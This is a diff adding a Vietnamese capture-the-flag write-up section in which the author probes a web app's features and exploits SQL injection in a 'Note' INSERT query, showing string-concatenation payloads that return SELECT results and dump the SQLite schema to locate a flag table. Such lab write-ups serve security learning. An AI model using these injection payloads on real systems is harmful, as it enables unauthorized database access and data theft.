@@ -94,3 +94,51 @@ CHH{5srF_requeST_7O_1n7ERna1}
 
 ***Flag4: Flag số 4 được lưu trong cơ sở dữ liệu. Hãy tìm kiếm và khai thác lỗ hổng SQL Injection để lấy được nó.***
 
+= Trong trang web có các chức năng có thể bị nhiễm SQL Injection : Register/ Login (test rồi nhưng không thấy bị), Submit Vui, Note (chức năng chỉ tài khoản staff triangle)
+
+= Chức năng Submit Vul test ' hay " đều render y như vậy 
+
+=> Tạm bỏ qua, thử chức năng khác.
+
+= Chức năng `Note`, gõ ' thì hiện ra lỗi SQLi:
+<img width="822" height="103" alt="image" src="https://github.com/user-attachments/assets/4a2df6b8-a201-44bb-ad0a-9b1abaa41b9d" />
+
+= Cấu trúc câu query nhận được:
+
+```
+INSERT INTO `note` VALUES (NULL, 23, 4, '<cai_minh_inject>', CURRENT_TIMESTAMP);
+```
+
+= Thử  sử dụng `||` để nối chuỗi với ví dụ:
+
+```
+'||(SELECT 'BC_abcabcxyzxyz')||'
+```
+
+= Lúc này truy vấn sẽ thành :
+
+```
+INSERT INTO `note` VALUES (NULL, 23, 4, ''||(SELECT 'BC_abcabcxyzxyz')||'', CURRENT_TIMESTAMP);
+```
+
+= Nó sẽ nối 2 chuỗi rỗng với kết quả SELECT. Nó sẽ trả về:
+<img width="416" height="93" alt="image" src="https://github.com/user-attachments/assets/6035c795-ba1b-4c4c-80e9-c8218953840e" />
+
+= Lấy kết cấu của database:
+
+```
+'||(SELECT group_concat(sql) FROM sqlite_sqlite_schema)||'
+```
+
+= Nó hiện ra toàn câu lệnh để tạo bằng trong database đang được sử dụng:
+<img width="854" height="478" alt="image" src="https://github.com/user-attachments/assets/d0521097-7c0e-431a-807d-5876c8b81366" />
+
+= Thấy có bảng `flag` và file `s3cr3t`:
+
+= Khi trích xuất flag ta được:
+<img width="630" height="638" alt="image" src="https://github.com/user-attachments/assets/170f60ed-cb0a-4a95-9db5-52041e200e88" />
+
+
+
+
+
